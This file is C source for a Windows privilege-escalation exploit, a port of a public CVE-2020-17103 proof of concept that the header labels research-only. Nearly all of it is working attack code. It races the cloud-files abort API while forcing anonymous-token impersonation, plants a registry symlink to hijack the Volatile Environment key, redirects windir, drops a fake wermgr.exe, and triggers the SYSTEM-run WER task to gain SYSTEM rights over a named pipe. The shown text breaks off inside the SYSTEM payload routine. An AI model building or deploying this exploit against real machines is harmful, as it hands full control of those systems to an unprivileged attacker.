// MiniPlasma.c
// C-port of PoC_AbortHydration_ArbitraryRegKey_EoP (originally C# / NtApiDotNet).
// Original technique: James Forshaw (Project Zero), CVE-2020-17103 family.
// Repo: github.com/.../MiniPlasma   (research / PoC only)
//
// Build (Visual Studio Developer Command Prompt, x64):
//   build.cmd
//
// Style: WinAPI, no-CRT (mainCRTStartup), Unicode, /NODEFAULTLIB-friendly.
// Manual ntdll prototypes are used to avoid pulling in <winternl.h> conflicts.

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <sddl.h>
#include <objbase.h>
#include <oleauto.h>
#include <taskschd.h>
#include <shellapi.h>

// ---------------------------------------------------------------------------
// No-CRT: compiler may emit memcpy intrinsic for struct/array copies.
// Provide a minimal implementation so the linker is satisfied.
// ---------------------------------------------------------------------------
#pragma function(memcpy)
void* __cdecl memcpy(void* dst, const void* src, size_t n)
{
    unsigned char* d = (unsigned char*)dst;
    const unsigned char* s = (const unsigned char*)src;
    while (n--) *d++ = *s++;
    return dst;
}

// ---------------------------------------------------------------------------
// Manual NTSTATUS / NT API declarations (avoid pulling all of winternl.h)
// ---------------------------------------------------------------------------

typedef LONG NTSTATUS;
#define NT_SUCCESS(s)             (((NTSTATUS)(s)) >= 0)
#define STATUS_SUCCESS            ((NTSTATUS)0x00000000L)
#define STATUS_NOTIFY_ENUM_DIR    ((NTSTATUS)0x0000010CL)
#define STATUS_OBJECT_NAME_NOT_FOUND ((NTSTATUS)0xC0000034L)

#define OBJ_CASE_INSENSITIVE      0x00000040L
#define OBJ_OPENLINK              0x00000100L

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

#define InitializeObjectAttributes(p, n, a, r, s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES);        \
    (p)->RootDirectory = (r);                       \
    (p)->ObjectName = (n);                          \
    (p)->Attributes = (a);                          \
    (p)->SecurityDescriptor = (s);                  \
    (p)->SecurityQualityOfService = NULL;           \
}

typedef struct _IO_STATUS_BLOCK {
    union { NTSTATUS Status; PVOID Pointer; };
    ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

typedef VOID (NTAPI *PIO_APC_ROUTINE)(PVOID, PIO_STATUS_BLOCK, ULONG);

// REG access masks
#ifndef KEY_READ
#define KEY_QUERY_VALUE          0x0001
#define KEY_SET_VALUE            0x0002
#define KEY_CREATE_SUB_KEY       0x0004
#define KEY_ENUMERATE_SUB_KEYS   0x0008
#endif
#ifndef DELETE
#define DELETE                   0x00010000L
#define READ_CONTROL             0x00020000L
#define WRITE_DAC                0x00040000L
#define WRITE_OWNER              0x00080000L
#endif

// REG_OPTION flags
#ifndef REG_OPTION_NON_VOLATILE
#define REG_OPTION_NON_VOLATILE  0x00000000L
#define REG_OPTION_CREATE_LINK   0x00000002L
#endif

// Notify filter (REG_NOTIFY_CHANGE_NAME already defined in winnt.h)

typedef enum _KEY_INFORMATION_CLASS {
    KeyBasicInformation = 0
} KEY_INFORMATION_CLASS;

typedef struct _KEY_BASIC_INFORMATION {
    LARGE_INTEGER LastWriteTime;
    ULONG TitleIndex;
    ULONG NameLength;
    WCHAR Name[1];
} KEY_BASIC_INFORMATION, *PKEY_BASIC_INFORMATION;

typedef enum _SECURITY_INFORMATION_BITS {
    SI_OWNER  = 0x00000001L,
    SI_GROUP  = 0x00000002L,
    SI_DACL   = 0x00000004L,
    SI_SACL   = 0x00000008L,
    SI_LABEL  = 0x00000010L
} SECURITY_INFORMATION_BITS;

// THREAD_INFORMATION_CLASS::ThreadImpersonationToken
#define ThreadImpersonationToken 5

// ntdll prototypes (resolved at runtime)
typedef NTSTATUS (NTAPI *t_NtOpenKey)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
typedef NTSTATUS (NTAPI *t_NtCreateKey)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, ULONG, PUNICODE_STRING, ULONG, PULONG);
typedef NTSTATUS (NTAPI *t_NtClose)(HANDLE);
typedef NTSTATUS (NTAPI *t_NtDeleteKey)(HANDLE);
typedef NTSTATUS (NTAPI *t_NtSetValueKey)(HANDLE, PUNICODE_STRING, ULONG, ULONG, PVOID, ULONG);
typedef NTSTATUS (NTAPI *t_NtSetSecurityObject)(HANDLE, ULONG, PSECURITY_DESCRIPTOR);
typedef NTSTATUS (NTAPI *t_NtEnumerateKey)(HANDLE, ULONG, KEY_INFORMATION_CLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *t_NtNotifyChangeKey)(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, ULONG, BOOLEAN, PVOID, ULONG, BOOLEAN);
typedef NTSTATUS (NTAPI *t_NtImpersonateAnonymousToken)(HANDLE);
typedef NTSTATUS (NTAPI *t_NtSetInformationThread)(HANDLE, ULONG, PVOID, ULONG);
typedef VOID     (NTAPI *t_RtlInitUnicodeString)(PUNICODE_STRING, PCWSTR);
typedef NTSTATUS (NTAPI *t_NtCurrentTeb_dummy)(void); // not used

static t_NtOpenKey                  pNtOpenKey;
static t_NtCreateKey                pNtCreateKey;
static t_NtClose                    pNtClose;
static t_NtDeleteKey                pNtDeleteKey;
static t_NtSetValueKey              pNtSetValueKey;
static t_NtSetSecurityObject        pNtSetSecurityObject;
static t_NtEnumerateKey             pNtEnumerateKey;
static t_NtNotifyChangeKey          pNtNotifyChangeKey;
static t_NtImpersonateAnonymousToken pNtImpersonateAnonymousToken;
static t_NtSetInformationThread     pNtSetInformationThread;
static t_RtlInitUnicodeString       pRtlInitUnicodeString;

// cldapi.dll
typedef struct _CF_PLATFORM_INFO {
    DWORD BuildNumber;
    DWORD RevisionNumber;
    DWORD IntegrationNumber;
} CF_PLATFORM_INFO;

typedef enum _CF_ABORT_FLAGS {
    CF_ABORT_FLAG_NONE     = 0,
    CF_ABORT_FLAG_UNBLOCK  = 1,
    CF_ABORT_FLAG_BLOCK    = 2
} CF_ABORT_FLAGS;

typedef HRESULT (WINAPI *t_CfAbortOperation)(DWORD pid, PVOID unknown, CF_ABORT_FLAGS flags);
typedef HRESULT (WINAPI *t_CfGetPlatformInfo)(CF_PLATFORM_INFO*);

static t_CfAbortOperation   pCfAbortOperation;
static t_CfGetPlatformInfo  pCfGetPlatformInfo;

// ---------------------------------------------------------------------------
// No-CRT print helpers
// ---------------------------------------------------------------------------

static HANDLE g_stdout;
static HANDLE g_heap;

static void OutW(const wchar_t* s)
{
    DWORD len = 0;
    while (s[len]) ++len;
    DWORD written;
    WriteConsoleW(g_stdout, s, len, &written, NULL);
}

static void OutLine(const wchar_t* s)
{
    OutW(s);
    OutW(L"\r\n");
}

// Formatted print via wsprintfW (from user32) — safe without CRT.
static void Printf(const wchar_t* fmt, ...)
{
    wchar_t buf[1024];
    va_list ap;
    va_start(ap, fmt);
    wvsprintfW(buf, fmt, ap);
    va_end(ap);
    OutW(buf);
}

static void Die(const wchar_t* msg, NTSTATUS st)
{
    Printf(L"[!] %s failed: 0x%08X\r\n", msg, (DWORD)st);
}

// Tiny string helpers (no CRT)
static SIZE_T StrLenW(const wchar_t* s)
{
    SIZE_T n = 0;
    while (s[n]) ++n;
    return n;
}

static void StrCpyW(wchar_t* dst, const wchar_t* src)
{
    while ((*dst++ = *src++) != 0);
}

static void StrCatW(wchar_t* dst, const wchar_t* src)
{
    while (*dst) ++dst;
    while ((*dst++ = *src++) != 0);
}

static BOOL StrEqW(const wchar_t* a, const wchar_t* b)
{
    while (*a && *a == *b) { ++a; ++b; }
    return *a == *b;
}

static int ParseIntW(const wchar_t* s)
{
    int v = 0, sign = 1;
    if (*s == L'-') { sign = -1; ++s; }
    while (*s >= L'0' && *s <= L'9') { v = v * 10 + (*s - L'0'); ++s; }
    return v * sign;
}

// ---------------------------------------------------------------------------
// Constants from the original PoC
// ---------------------------------------------------------------------------

static const wchar_t ROOT_KEY[]    = L"\\Registry\\User\\.DEFAULT\\Software\\Policies\\Microsoft";
static const wchar_t CLOUD_FILES[] = L"\\Registry\\User\\.DEFAULT\\Software\\Policies\\Microsoft\\CloudFiles";
static const wchar_t BLOCKED_APPS[]= L"\\Registry\\User\\.DEFAULT\\Software\\Policies\\Microsoft\\CloudFiles\\BlockedApps";
static const wchar_t TARGET_KEY[]  = L"\\Registry\\User\\.DEFAULT\\Volatile Environment";

static const wchar_t SDDL_ALL[]    = L"D:(A;OICIIO;GA;;;WD)(A;OICIIO;GA;;;AN)(A;;GA;;;WD)(A;;GA;;;AN)S:(ML;OICI;NW;;;S-1-16-0)";

#define MAX_STAGE 4

// ---------------------------------------------------------------------------
// Resolve ntdll / cldapi
// ---------------------------------------------------------------------------

static BOOL ResolveApi(void)
{
    HMODULE ntdll  = GetModuleHandleW(L"ntdll.dll");
    HMODULE cldapi = LoadLibraryW(L"cldapi.dll");
    if (!ntdll || !cldapi) return FALSE;

#define R(h, n) p##n = (t_##n)GetProcAddress(h, #n); if (!p##n) return FALSE
    R(ntdll, NtOpenKey);
    R(ntdll, NtCreateKey);
    R(ntdll, NtClose);
    R(ntdll, NtDeleteKey);
    R(ntdll, NtSetValueKey);
    R(ntdll, NtSetSecurityObject);
    R(ntdll, NtEnumerateKey);
    R(ntdll, NtNotifyChangeKey);
    R(ntdll, NtImpersonateAnonymousToken);
    R(ntdll, NtSetInformationThread);
    R(ntdll, RtlInitUnicodeString);
    R(cldapi, CfAbortOperation);
    R(cldapi, CfGetPlatformInfo);
#undef R
    return TRUE;
}

// ---------------------------------------------------------------------------
// Registry key open with fallback to anonymous-token impersonation
// ---------------------------------------------------------------------------

static void InitUS(PUNICODE_STRING us, const wchar_t* s)
{
    pRtlInitUnicodeString(us, s);
}

// Opens an NT registry key.  If the direct open fails, impersonate anonymous
// token and retry — this is the trick the bug relies on (anonymous-token-owned
// key whose ACL grants WD/AN full control after we plant our descriptor).
static HANDLE OpenKey(HANDLE root, const wchar_t* path, ACCESS_MASK access)
{
    Printf(L"Opening %s for 0x%08X\r\n", path, access);

    UNICODE_STRING us;
    InitUS(&us, path);
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE | OBJ_OPENLINK, root, NULL);

    HANDLE h = NULL;
    NTSTATUS st = pNtOpenKey(&h, access, &oa);
    if (NT_SUCCESS(st))
        return h;

    // Fallback: impersonate anonymous token on current thread, retry, revert.
    NTSTATUS imp = pNtImpersonateAnonymousToken(GetCurrentThread());
    if (!NT_SUCCESS(imp))
    {
        Die(L"NtImpersonateAnonymousToken", imp);
        return NULL;
    }
    st = pNtOpenKey(&h, access, &oa);

    // revert thread token
    HANDLE nullh = NULL;
    pNtSetInformationThread(GetCurrentThread(), ThreadImpersonationToken, &nullh, sizeof(HANDLE));

    if (!NT_SUCCESS(st))
    {
        Die(L"NtOpenKey", st);
        return NULL;
    }
    return h;
}

static BOOL SetSd(HANDLE key, ULONG info)
{
    PSECURITY_DESCRIPTOR sd = NULL;
    ULONG sdSize = 0;
    if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(
            SDDL_ALL, SDDL_REVISION_1, &sd, &sdSize))
    {
        Printf(L"[!] SDDL conversion failed: %u\r\n", GetLastError());
        return FALSE;
    }
    NTSTATUS st = pNtSetSecurityObject(key, info, sd);
    LocalFree(sd);
    if (!NT_SUCCESS(st))
    {
        Die(L"NtSetSecurityObject", st);
        return FALSE;
    }
    return TRUE;
}

// Forward decl
static void DeleteRegistryTree(HANDLE root);

// Force-delete a single subkey by hammering its ACL.
static void ForceKeyDeleteKey(HANDLE root, const wchar_t* name)
{
    Printf(L"Deleting subkey: %s\r\n", name);

    HANDLE key = OpenKey(root, name, WRITE_DAC);
    if (key)
    {
        OutLine(L"  Opened for WriteDac");
        SetSd(key, SI_DACL);
        pNtClose(key);
    }

    key = OpenKey(root, name, WRITE_OWNER);
    if (key)
    {
        OutLine(L"  Opened for WriteOwner");
        SetSd(key, SI_LABEL);
        pNtClose(key);
    }

    key = OpenKey(root, name, DELETE | KEY_ENUMERATE_SUB_KEYS);
    if (key)
    {
        OutLine(L"  Opened for Delete|Enum");
        DeleteRegistryTree(key);
        pNtDeleteKey(key);
        pNtClose(key);
    }
}

static void DeleteRegistryTree(HANDLE root)
{
    // Snapshot first level of subkeys, then recurse.
    for (;;)
    {
        BYTE  buf[1024];
        ULONG len = 0;
        NTSTATUS st = pNtEnumerateKey(root, 0, KeyBasicInformation, buf, sizeof(buf), &len);
        if (!NT_SUCCESS(st)) break;
        PKEY_BASIC_INFORMATION kbi = (PKEY_BASIC_INFORMATION)buf;
        // Copy name into NUL-terminated buffer.
        wchar_t name[260];
        ULONG chars = kbi->NameLength / sizeof(wchar_t);
        if (chars >= 260) chars = 259;
        for (ULONG i = 0; i < chars; ++i) name[i] = kbi->Name[i];
        name[chars] = 0;
        ForceKeyDeleteKey(root, name);
    }
}

// ---------------------------------------------------------------------------
// Threads: anonymous-token hammer + change watcher
// ---------------------------------------------------------------------------

static volatile BOOL g_anonStop = FALSE;

static DWORD WINAPI ForceTokenThread(LPVOID param)
{
    HANDLE target_thread = (HANDLE)param;

    // Open anonymous token via ImpersonateAnonymousToken on a worker thread.
    // We need a TOKEN HANDLE to set on the foreign thread repeatedly.
    if (!ImpersonateAnonymousToken(GetCurrentThread()))
    {
        Printf(L"[!] ImpersonateAnonymousToken failed: %u\r\n", GetLastError());
        return 1;
    }
    HANDLE anon = NULL;
    if (!OpenThreadToken(GetCurrentThread(),
                        TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY,
                        TRUE, &anon))
    {
        Printf(L"[!] OpenThreadToken failed: %u\r\n", GetLastError());
        RevertToSelf();
        return 1;
    }
    RevertToSelf();

    Printf(L"[force-token] hammering thread %p with anon token\r\n", target_thread);

    HANDLE nullh = NULL;
    while (!g_anonStop)
    {
        pNtSetInformationThread(target_thread, ThreadImpersonationToken, &anon, sizeof(HANDLE));
        pNtSetInformationThread(target_thread, ThreadImpersonationToken, &nullh, sizeof(HANDLE));
    }
    CloseHandle(anon);
    return 0;
}

typedef struct {
    BOOL watch_root_key; // TRUE => ROOT_KEY else .DEFAULT
} CheckArgs;

static DWORD WINAPI CheckKeyThread(LPVOID p)
{
    CheckArgs* a = (CheckArgs*)p;
    const wchar_t* path = a->watch_root_key
        ? ROOT_KEY
        : L"\\Registry\\User\\.DEFAULT";

    UNICODE_STRING us;
    InitUS(&us, path);
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE key = NULL;
    NTSTATUS st = pNtOpenKey(&key, MAXIMUM_ALLOWED, &oa);
    if (!NT_SUCCESS(st))
    {
        Die(L"CheckKeyThread NtOpenKey", st);
        return 1;
    }

    for (;;)
    {
        IO_STATUS_BLOCK iosb;
        st = pNtNotifyChangeKey(key, NULL, NULL, NULL, &iosb,
                                REG_NOTIFY_CHANGE_NAME, TRUE, NULL, 0, FALSE);
        if (st == STATUS_NOTIFY_ENUM_DIR)
        {
            OutLine(L"[watcher] change detected — exiting process");
            ExitProcess(0);
        }
    }
}

// ---------------------------------------------------------------------------
// Symbolic link in registry: create key with REG_OPTION_CREATE_LINK and set
// "SymbolicLinkValue" REG_LINK value pointing at TARGET_KEY.
// ---------------------------------------------------------------------------

static BOOL CreateRegistrySymlink(const wchar_t* linkPath, const wchar_t* targetPath)
{
    UNICODE_STRING us;
    InitUS(&us, linkPath);
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE | OBJ_OPENLINK, NULL, NULL);

    HANDLE key = NULL;
    ULONG disp = 0;
    NTSTATUS st = pNtCreateKey(&key, KEY_ALL_ACCESS, &oa, 0, NULL,
                               REG_OPTION_CREATE_LINK, &disp);
    if (!NT_SUCCESS(st))
    {
        Die(L"NtCreateKey (symlink)", st);
        return FALSE;
    }

    UNICODE_STRING vname;
    InitUS(&vname, L"SymbolicLinkValue");
    SIZE_T tlen = StrLenW(targetPath) * sizeof(wchar_t);
    st = pNtSetValueKey(key, &vname, 0, REG_LINK, (PVOID)targetPath, (ULONG)tlen);
    pNtClose(key);
    if (!NT_SUCCESS(st))
    {
        Die(L"NtSetValueKey (REG_LINK)", st);
        return FALSE;
    }
    OutLine(L"[+] Registry symlink planted.");
    return TRUE;
}

// ---------------------------------------------------------------------------
// Stage 1 — Race CfAbortOperation against registry mutation
// ---------------------------------------------------------------------------

static void Stage1(BOOL watch_root_key)
{
    static CheckArgs ca;
    ca.watch_root_key = watch_root_key;

    HANDLE checkTh = CreateThread(NULL, 0, CheckKeyThread, &ca, 0, NULL);

    // Give watcher time to arm
    Sleep(1000);

    // Duplicate current thread handle to pass to ForceTokenThread.
    HANDLE meDup = NULL;
    DuplicateHandle(GetCurrentProcess(), GetCurrentThread(),
                    GetCurrentProcess(), &meDup,
                    THREAD_SET_THREAD_TOKEN | THREAD_QUERY_INFORMATION,
                    FALSE, 0);
    HANDLE anonTh = CreateThread(NULL, 0, ForceTokenThread, meDup, 0, NULL);

    // Hammer the vulnerable API while anonymous-token thrash sets our context.
    DWORD pid = GetCurrentProcessId();
    OutLine(L"[stage1] Hammering CfAbortOperation...");
    for (;;)
    {
        pCfAbortOperation(pid, NULL, CF_ABORT_FLAG_BLOCK);
    }
    // never reached
    (void)checkTh; (void)anonTh;
}

// ---------------------------------------------------------------------------
// Stage 0 — Re-launch self with stages 1..MAX_STAGE-1
// ---------------------------------------------------------------------------

static void Stage0(void)
{
    wchar_t selfPath[MAX_PATH];
    GetModuleFileNameW(NULL, selfPath, MAX_PATH);

    for (int i = 1; i < MAX_STAGE; ++i)
    {
        wchar_t cmd[MAX_PATH + 32];
        wsprintfW(cmd, L"\"%s\" %d", selfPath, i);

        STARTUPINFOW si; ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
        PROCESS_INFORMATION pi; ZeroMemory(&pi, sizeof(pi));

        Printf(L"[stage0] launching stage %d\r\n", i);
        if (!CreateProcessW(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
        {
            Printf(L"[!] CreateProcess failed for stage %d: %u\r\n", i, GetLastError());
            return;
        }
        // Original waits 10ms then errors if not done; replicate.
        DWORD w = WaitForSingleObject(pi.hProcess, 10);
        if (w != WAIT_OBJECT_0)
        {
            // The expected case: race child exits via its watcher.  Just wait
            // until it terminates so we sequence stages.
            WaitForSingleObject(pi.hProcess, INFINITE);
        }
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

// ---------------------------------------------------------------------------
// Stage 2 — Wipe CloudFiles, plant symlink BlockedApps -> Volatile Environment,
// then race again.
// ---------------------------------------------------------------------------

static void Stage2(void)
{
    HANDLE key = OpenKey(NULL, CLOUD_FILES,
                         WRITE_DAC | WRITE_OWNER | KEY_ENUMERATE_SUB_KEYS);
    if (key)
    {
        SetSd(key, SI_DACL | SI_LABEL);
        DeleteRegistryTree(key);
        pNtClose(key);
    }

    CreateRegistrySymlink(BLOCKED_APPS, TARGET_KEY);
    Stage1(FALSE);
}

// ---------------------------------------------------------------------------
// Stage 3 — Use rewritten Volatile Environment to hijack WER QueueReporting.
// ---------------------------------------------------------------------------

// Walk subkeys via Registry::Users (HKU\.DEFAULT\Volatile Environment) and
// delete them via the NT path (which now points to whatever the link did).
static void Stage3_DeleteVolatileSubkeys(void)
{
    HKEY hku;
    if (RegOpenKeyExW(HKEY_USERS, L".DEFAULT\\Volatile Environment", 0,
                      KEY_READ, &hku) != ERROR_SUCCESS)
    {
        OutLine(L"[stage3] no Volatile Environment subkey via HKU — skipping enum");
        return;
    }

    for (DWORD idx = 0; ; ++idx)
    {
        wchar_t name[256];
        DWORD nlen = 256;
        LONG r = RegEnumKeyExW(hku, idx, name, &nlen, NULL, NULL, NULL, NULL);
        if (r != ERROR_SUCCESS) break;

        wchar_t full[600];
        StrCpyW(full, TARGET_KEY);
        StrCatW(full, L"\\");
        StrCatW(full, name);
        Printf(L"[stage3] cleaning subkey: %s\r\n", full);

        // First try plain open for WRITE_DAC, then fall back.
        UNICODE_STRING us; InitUS(&us, full);
        OBJECT_ATTRIBUTES oa;
        InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);
        HANDLE sub = NULL;
        NTSTATUS st = pNtOpenKey(&sub, WRITE_DAC, &oa);
        if (!NT_SUCCESS(st))
            sub = OpenKey(NULL, full, WRITE_DAC);
        if (sub) { SetSd(sub, SI_DACL); pNtClose(sub); }

        sub = NULL;
        st = pNtOpenKey(&sub, DELETE, &oa);
        if (NT_SUCCESS(st)) { pNtDeleteKey(sub); pNtClose(sub); }
    }
    RegCloseKey(hku);
}

static BOOL RunWerQueueReportingTask(void)
{
    // COM init for STA-safe usage from a console exe.
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) { Printf(L"[!] CoInitializeEx: 0x%08X\r\n", hr); return FALSE; }
    hr = CoInitializeSecurity(NULL, -1, NULL, NULL,
                              RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                              RPC_C_IMP_LEVEL_IMPERSONATE,
                              NULL, 0, NULL);
    // Ignore RPC_E_TOO_LATE.

    ITaskService* svc = NULL;
    hr = CoCreateInstance(&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
                          &IID_ITaskService, (void**)&svc);
    if (FAILED(hr)) { Printf(L"[!] CoCreateInstance: 0x%08X\r\n", hr); return FALSE; }

    VARIANT vEmpty; VariantInit(&vEmpty);
    hr = svc->lpVtbl->Connect(svc, vEmpty, vEmpty, vEmpty, vEmpty);
    if (FAILED(hr)) { Printf(L"[!] ITaskService::Connect: 0x%08X\r\n", hr); svc->lpVtbl->Release(svc); return FALSE; }

    ITaskFolder* folder = NULL;
    BSTR bFolder = SysAllocString(L"\\Microsoft\\Windows\\Windows Error Reporting");
    hr = svc->lpVtbl->GetFolder(svc, bFolder, &folder);
    SysFreeString(bFolder);
    if (FAILED(hr)) { Printf(L"[!] GetFolder: 0x%08X\r\n", hr); svc->lpVtbl->Release(svc); return FALSE; }

    IRegisteredTask* rt = NULL;
    BSTR bTask = SysAllocString(L"QueueReporting");
    hr = folder->lpVtbl->GetTask(folder, bTask, &rt);
    SysFreeString(bTask);
    folder->lpVtbl->Release(folder);
    if (FAILED(hr)) { Printf(L"[!] GetTask: 0x%08X\r\n", hr); svc->lpVtbl->Release(svc); return FALSE; }

    IRunningTask* running = NULL;
    hr = rt->lpVtbl->Run(rt, vEmpty, &running);
    if (FAILED(hr)) { Printf(L"[!] RegTask::Run: 0x%08X\r\n", hr); rt->lpVtbl->Release(rt); svc->lpVtbl->Release(svc); return FALSE; }
    if (running) running->lpVtbl->Release(running);
    rt->lpVtbl->Release(rt);
    svc->lpVtbl->Release(svc);
    OutLine(L"[stage3] QueueReporting triggered.");
    return TRUE;
}

static void Stage3(void)
{
    // 1. Remove the symlink BlockedApps.
    HANDLE key = OpenKey(NULL, BLOCKED_APPS, DELETE);
    if (key) { OutLine(L"[stage3] removing symlink"); pNtDeleteKey(key); pNtClose(key); }

    // 2. Rewrite ACL on Volatile Environment (now owned by anonymous).
    key = OpenKey(NULL, TARGET_KEY, WRITE_DAC | WRITE_OWNER);
    if (key) { SetSd(key, SI_DACL | SI_LABEL); pNtClose(key); }

    // 3. Delete subkeys under Volatile Environment.
    Stage3_DeleteVolatileSubkeys();

    // 4. Set windir = <our directory> on the (now controllable) key.
    wchar_t selfDir[MAX_PATH];
    GetModuleFileNameW(NULL, selfDir, MAX_PATH);
    for (int i = (int)StrLenW(selfDir) - 1; i >= 0; --i)
    {
        if (selfDir[i] == L'\\') { selfDir[i] = 0; break; }
    }

    {
        UNICODE_STRING us; InitUS(&us, TARGET_KEY);
        OBJECT_ATTRIBUTES oa;
        InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);
        HANDLE k2 = NULL;
        NTSTATUS st = pNtOpenKey(&k2, KEY_SET_VALUE, &oa);
        if (NT_SUCCESS(st))
        {
            UNICODE_STRING vn; InitUS(&vn, L"windir");
            ULONG bytes = (ULONG)((StrLenW(selfDir) + 1) * sizeof(wchar_t));
            pNtSetValueKey(k2, &vn, 0, REG_SZ, selfDir, bytes);
            pNtClose(k2);
            Printf(L"[stage3] set windir = %s\r\n", selfDir);
        }
        else Die(L"open TARGET_KEY for SetValue", st);
    }

    // 5. Drop fake wermgr.exe = <selfDir>\System32\wermgr.exe
    wchar_t fakeSys32[MAX_PATH];
    StrCpyW(fakeSys32, selfDir);
    StrCatW(fakeSys32, L"\\System32");
    OutLine(L"[stage3] creating System32 dir");
    if (!CreateDirectoryW(fakeSys32, NULL))
    {
        DWORD le = GetLastError();
        if (le != ERROR_ALREADY_EXISTS)
            Printf(L"[!] CreateDirectory: %u\r\n", le);
    }

    wchar_t fakeWer[MAX_PATH];
    StrCpyW(fakeWer, fakeSys32);
    StrCatW(fakeWer, L"\\wermgr.exe");

    wchar_t self[MAX_PATH];
    GetModuleFileNameW(NULL, self, MAX_PATH);
    Printf(L"[stage3] copying %s -> %s\r\n", self, fakeWer);
    if (!CopyFileW(self, fakeWer, FALSE))
        Printf(L"[!] CopyFile: %u\r\n", GetLastError());

    // 6. Stand up an OVERLAPPED named pipe so ConnectNamedPipe returns
    //    immediately and we can wait on the event later.
    OutLine(L"[stage3] creating named pipe");
    HANDLE pipe = CreateNamedPipeW(L"\\\\.\\pipe\\MiniPlasmaWERPipe",
                                   PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
                                   PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
                                   1, 4096, 4096, 0, NULL);
    if (pipe == INVALID_HANDLE_VALUE)
    {
        Printf(L"[!] CreateNamedPipe: %u\r\n", GetLastError());
        return;
    }

    OVERLAPPED ov; ZeroMemory(&ov, sizeof(ov));
    ov.hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);

    OutLine(L"[stage3] arming ConnectNamedPipe (async)");
    BOOL ok = ConnectNamedPipe(pipe, &ov);
    if (!ok)
    {
        DWORD le = GetLastError();
        if (le == ERROR_PIPE_CONNECTED)
        {
            // Already connected before we even got here — signal manually.
            SetEvent(ov.hEvent);
        }
        else if (le != ERROR_IO_PENDING)
        {
            Printf(L"[!] ConnectNamedPipe: %u\r\n", le);
            CloseHandle(ov.hEvent);
            CloseHandle(pipe);
            return;
        }
    }

    // 7. Trigger WER QueueReporting task (runs as SYSTEM).
    OutLine(L"[stage3] triggering WER QueueReporting task");
    if (!RunWerQueueReportingTask())
        OutLine(L"[!] Could not start WER task; bailing.");

    // 8. Wait up to 2 seconds for fake wermgr (SYSTEM) to connect.
    OutLine(L"[stage3] waiting for SYSTEM client to connect (2s)");
    DWORD wr = WaitForSingleObject(ov.hEvent, 2000);
    if (wr == WAIT_OBJECT_0)
        OutLine(L"[+] Exploit succeeded — SYSTEM connected.");
    else
    {
        OutLine(L"[-] Exploit failed (no connection).");
        CancelIoEx(pipe, &ov);
    }

    CloseHandle(ov.hEvent);
    CloseHandle(pipe);

    // 9. Clean up dropped wermgr.exe / Volatile Environment.
    Sleep(1000);
    DeleteFileW(fakeWer);
    RemoveDirectoryW(fakeSys32);

    key = NULL;
    {
        UNICODE_STRING us; InitUS(&us, TARGET_KEY);
        OBJECT_ATTRIBUTES oa;
        InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);
        if (NT_SUCCESS(pNtOpenKey(&key, DELETE, &oa)))
        {
            pNtDeleteKey(key);
            pNtClose(key);
        }
    }
}

// ---------------------------------------------------------------------------
// Final SYSTEM hop: invoked when fake wermgr.exe (running as LocalSystem)
// runs us.  Connect back to MiniPlasmaWERPipe, learn the user's session id,
// spawn conhost.exe as SYSTEM in that session.
// ---------------------------------------------------------------------------

static BOOL IsLocalSystem(void)
{
    HANDLE tok = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok)) return FALSE;
    BYTE buf[1024]; DWORD ret = 0;
    BOOL ok = GetTokenInformation(tok, TokenUser, buf, sizeof(buf), &ret);
    CloseHandle(tok);
    if (!ok) return FALSE;
    TOKEN_USER* tu = (TOKEN_USER*)buf;

    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
    PSID sysSid = NULL;
    AllocateAndInitializeSid(&ntAuth, 1, SECURITY_LOCAL_SYSTEM_RID,
                             0, 0, 0, 0, 0, 0, 0, &sysSid);
    BOOL eq = EqualSid(tu->User.Sid, sysSid);
    FreeSid(sysSid);
    return eq;
}

static void SystemPayload(void)
{
    SetEnvironmentVariableW(L"windir", L"C:\\Windows");

    HANDLE pipe = INVALID_HANDLE_VALUE;
    for (int i = 0; i < 50 && pipe == INVALID_HANDLE_VALUE; ++i)
    {
        pipe = CreateFileW(L"\\\\.\\pipe\\MiniPlasmaWERPipe",
                           GENERIC_READ | GENERIC_WRITE, 0, NULL,
                           OPEN_EXISTING, 0, NULL);
        if (pipe == INVALID_HANDLE_VALUE) Sleep(100);
    }
    if (pipe == INVALID_HANDLE_VALUE) return;

    ULONG sessionId = 0;
    if (!GetNamedPipeServerSessionId(pipe, &sessionId))
    {
        CloseHandle(pipe);
        return;
    }
    CloseHandle(pipe);

    HANDLE tok = NULL, dupTok = NULL;
